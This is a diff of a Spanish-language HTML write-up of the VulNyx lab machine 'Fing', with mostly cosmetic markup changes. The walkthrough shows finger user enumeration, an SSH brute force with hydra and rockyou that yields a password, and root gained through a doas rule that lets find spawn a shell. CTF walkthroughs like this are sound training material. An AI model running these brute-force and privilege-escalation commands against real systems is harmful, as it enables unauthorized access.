@@ -17,9 +17,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>VulNyx - Fing</title>
     <link rel="shortcut icon" href="../../assets/img/favicon.ico">
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
-    <link rel="stylesheet"
-      href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.7.0/build/styles/default.min.css">
     <link rel="stylesheet" href="../../assets/highlight/styles/vs2015.min.css">
     <script src="../../assets/highlight/highlight.min.js"></script>
     <link rel="stylesheet" href="../../assets/css/nyx_w.css">  
@@ -47,7 +45,7 @@ PORT   STATE SERVICE
 </code></pre>
             <h3>Escaneo de servicios</h3>
 <pre class="pre__nyx">
-<code class="language-js">❯ nmap -sVC -v -p 22,79,80 192.168.1.16
+<code class="code language-js">❯ nmap -sVC -v -p 22,79,80 192.168.1.16
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
@@ -67,7 +65,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
             <h3>HTTP</h3>                
             
 <pre class="pre__nyx">
-<code class="language-js">❯ whatweb -v 192.168.1.16
+<code class="code language-js">❯ whatweb -v 192.168.1.16
 WhatWeb report for http://192.168.1.16
 Status    : 200 OK
 Title     : Apache2 Debian Default Page: It works
@@ -78,7 +76,7 @@ Summary   : Apache[2.4.56], HTTPServer[Debian Linux][Apache/2.4.56 (Debian)]
 </code></pre>
             <p>Para enumerar el puerto 79 he usado esta herramienta en perl<code class="code_negrita">&nbsp;finger-user-enum.pl&nbsp;</code>y he encontrado estos dos usuarios.</p>
 <pre class="pre__nyx">
-<code class="language-js">❯ ./finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.1.16
+<code class="code language-js">❯ ./finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.1.16
 Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )
     
  ----------------------------------------------------------
@@ -99,39 +97,39 @@ adam@192.168.1.16: Login: adam    Name: adam..Directory: /home/adam    Shell: /b
 </code></pre>
 
             
-            <p>Con hydra realizo fuerza bruta al servicio<code class="code_negrita">&nbsp;SSH&nbsp;</code>con el usuario<code class="code_negrita">&nbsp;adam</code>.</p>
+            <p>Con hydra realizo fuerza bruta al servicio<code class="code_negrita">&nbsp;SSH&nbsp;</code>con el usuario<code class="code_negrita">&nbsp;adam&nbsp;</code>.</p>
 <pre class="pre__nyx">
-<code class="language-js">❯ hydra -t 50 -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.16 -V -f -I
+<code class="code language-js">❯ hydra -t 50 -l adam -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.16 -V -f -I
 [22][ssh] host: 192.168.1.16   login: adam   password: passion
 </code></pre>
             <p>Me conecto al sistema como usuario Adam.</p>
-<pre class="pre__nyx"><code class="language-js">❯ ssh adam@192.168.1.16
+<pre class="pre__nyx"><code class="code language-js">❯ ssh adam@192.168.1.16
 adam@192.168.1.16's password:
 adam@fing:~$ id
 uid=1000(adam) gid=1000(adam) grupos=1000(adam)        
 </code></pre>
 
             <p>Busco en todo el sistema los binarios que tengan permisos<code class="code_negrita">&nbsp;SUID&nbsp;</code>y encuentro el binario doas. El binario doas es una alternativa a sudo y se puede configurar para otorgar privilegios a usuarios específicos.</p>
-<pre class="pre__nyx"><code class="language-js">adam@fing:~$ find / -perm -4000 2>/dev/null
+<pre class="pre__nyx"><code class="code language-js">adam@fing:~$ find / -perm -4000 2>/dev/null
 /usr/bin/doas
 </code></pre>
 
             <p>Busco el archivo<code class="code_negrita">&nbsp;doas.conf&nbsp;</code>que és el encargado de dar permisos a otros usuarios.</p>
-<pre class="pre__nyx"><code class="language-js">find / -type f -name "doas.conf" 2>/dev/null
+<pre class="pre__nyx"><code class="code language-js">find / -type f -name "doas.conf" 2>/dev/null
 /etc/doas.conf
 </code></pre>
             <p>El usuario adam puede usar doas con el usuario root, lanzar find con permisos de root y sin usar contraseña.</p>
-<pre class="pre__nyx"><code class="language-js">cat /etc/doas.conf
+<pre class="pre__nyx"><code class="code language-js">cat /etc/doas.conf
 permit nopass keepenv adam as root cmd /usr/bin/find
 </code></pre>
 
             <p>Si uso doas con el usuario adam no puedo ver el directorio de root.</p>
-<pre class="pre__nyx"><code class="language-js">adam@fing:~$ doas -u adam /usr/bin/find /root
+<pre class="pre__nyx"><code class="code language-js">adam@fing:~$ doas -u adam /usr/bin/find /root
 doas: Operation not permitted
 </code></pre>
 
             <p>Pero si uso doas con el usuario root si puedo ver el directorio de root.</p>
-<pre class="pre__nyx"><code class="language-js">adam@fing:~$ doas -u root /usr/bin/find /root
+<pre class="pre__nyx"><code class="code language-js">adam@fing:~$ doas -u root /usr/bin/find /root
 /root
 /root/.profile
 /root/.bash_history
@@ -143,17 +141,17 @@ doas: Operation not permitted
 </code></pre>
 
             <p>Para obtener el root he usado el recurso gtfobins.</p>
-<pre class="pre__nyx"><code class="language-txt">https://gtfobins.github.io/gtfobins/find/#suid
+<pre class="pre__nyx"><code class="code language-txt">https://gtfobins.github.io/gtfobins/find/#suid
 </code></pre>
 
 
         <p>Obtengo el root de la siguiente forma.</p>
-<pre class="pre__nyx"><code class="language-js">adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/bash -p \; -quit
+<pre class="pre__nyx"><code class="code language-js">adam@fing:~$ doas -u root /usr/bin/find . -exec /bin/bash -p \; -quit
 root@fing:/home/adam# id
 uid=0(root) gid=0(root) grupos=0(root)
 </code></pre>
 
-            <p>Y con esto ya tenemos resuelta la máquina Fing del sr d4t4s3c, Saludos!</p>
+            <p>Y con esto ya tenemos resuelta la máquina Fing del sr d4t4s3c</p>
 
     </main>
         <footer class="footer">
